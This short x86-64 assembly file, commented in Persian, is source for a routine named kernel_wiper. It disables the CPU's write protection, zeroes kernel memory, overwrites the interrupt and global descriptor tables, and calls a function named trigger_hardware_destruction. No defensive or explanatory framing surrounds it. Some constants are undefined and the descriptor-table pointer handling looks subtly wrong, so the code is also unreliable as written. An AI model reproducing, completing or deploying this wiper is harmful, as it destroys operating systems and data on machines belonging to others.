section .text
global kernel_wiper

kernel_wiper:
    ; غیرفعال‌کردن حفاظت حافظه
    mov rax, cr0
    and rax, ~CR0_WP
    mov cr0, rax
    
    ; پاک‌کردن حافظه هسته
    mov rdi, KERNEL_BASE
    mov rcx, KERNEL_SIZE
    xor rax, rax
    rep stosb
    
    ; پاک‌کردن حافظه تمیز نشده
    mov rdi, UNSAFE_MEMORY_REGION
    mov rcx, UNSAFE_MEMORY_SIZE
    rep stosb
    
    ; تخریب IDT
    sidt [idt_ptr]
    mov rdi, [idt_ptr + 1]
    mov rcx, 256 * 16
    rep stosb
    
    ; تخریب GDT
    sgdt [gdt_ptr]
    mov rdi, [gdt_ptr + 1]
    mov rcx, GDT_SIZE
    rep stosb
    
    ; فعال‌کردن تخریب فیزیکی
    call trigger_hardware_destruction
    ret
    